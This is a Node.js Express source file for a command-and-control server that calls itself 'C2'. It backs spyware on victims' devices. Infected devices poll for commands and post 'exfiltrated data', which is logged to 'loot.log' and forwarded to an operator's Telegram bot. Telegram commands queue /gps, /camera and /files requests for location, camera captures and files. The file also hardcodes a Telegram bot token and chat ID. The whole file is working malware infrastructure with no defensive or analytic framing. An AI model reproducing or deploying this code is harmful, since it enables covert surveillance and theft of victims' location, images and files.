const express = require('express');
const fs = require('fs');
const axios = require('axios');
const app = express();

const TELEGRAM_BOT = '7678670381:AAFPa1p6fFMB7ImwXIMYtjhRJ2arybZZ3io';
const CHAT_ID = '8175955990';

let lastCommand = "noop";

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 🔁 Device polls here for command
app.get('/next', (req, res) => {
    const cmd = lastCommand;
    lastCommand = "noop";
    res.send(cmd);
});

// 📥 From device: POST exfiltrated data
app.post('/data', async (req, res) => {
    const type = req.body.type || "data";
    const info = req.body.info || "empty";

    const msg = `[${new Date().toISOString()}]\nType: ${type}\n${info}`;
    fs.appendFileSync("loot.log", msg + '\n\n');

    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`, {
        chat_id: CHAT_ID,
        text: msg
    });

    res.send("ok");
});

// 🤖 Telegram webhook handler
app.post(`/bot${TELEGRAM_BOT}`, async (req, res) => {
    const msg = req.body.message;
    if (!msg || !msg.text) return res.send();

    const cmd = msg.text.trim().toLowerCase();
    if (["/gps", "/camera", "/files"].includes(cmd)) {
        lastCommand = cmd.replace("/", "");
    }

    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`, {
        chat_id: msg.chat.id,
        text: `✅ Command received: ${cmd}`
    });

    res.send();
});

app.listen(3000, () => console.log("C2 running on port 3000"));
